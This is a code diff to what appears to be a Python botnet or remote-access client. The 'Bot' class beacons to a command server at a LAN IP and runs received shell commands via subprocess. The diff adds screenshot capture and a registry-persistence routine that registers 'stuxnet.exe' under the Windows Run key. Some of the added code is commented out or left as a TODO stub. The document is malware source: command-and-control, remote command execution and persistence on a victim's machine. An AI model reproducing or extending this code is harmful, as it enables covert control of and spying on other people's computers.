@@ -7,16 +7,20 @@ import random
 import string
 from time import sleep
 import subprocess
+import pyautogui
+import winreg
 
 global API,IP,PORT,INTERVAL;
 API = 'dcf3245cacb55b31045568f5a515cfb7'
-IP = '127.0.0.1'
+IP = '192.168.43.223'
 PORT = 2003
 INTERVAL = 5
 
 class Bot():
     def __init__(self):
         self.data = False
+        # self.edit_registry('Software\Microsoft\Windows\CurrentVersion\Run','Services')
+
         self.s = socket.socket()
 
     def send_beacons(self):
@@ -78,6 +82,18 @@ class Bot():
         self.s.send(pkt)
         self.send_beacons()
 
+    def edit_registry(self,reg_path,name):
+        pwd = os.getcwd()
+        path = pwd + '\\stuxnet.exe'
+
+        # Path : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+        # reg_path = 'Software\Microsoft\Windows\CurrentVersion\Run'
+
+        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,reg_path)
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,reg_path,0,winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key,name,0,winreg.REG_SZ,path)
+        winreg.CloseKey(key)
+
     def make_pkt(self,typ,**kwargs):
         if typ == 1:
             code = '<10sH30s20s'
@@ -122,6 +138,13 @@ class Bot():
             stdout,stderr = process.communicate()
             resp = stdout.decode()
         
+        if 'screenshot' in cmd:
+            image = pyautogui.screenshot()
+            # TODO process and send image
+            pass
+        
+        else:
+            resp = 'Unable to process Command'
         
         return resp
 
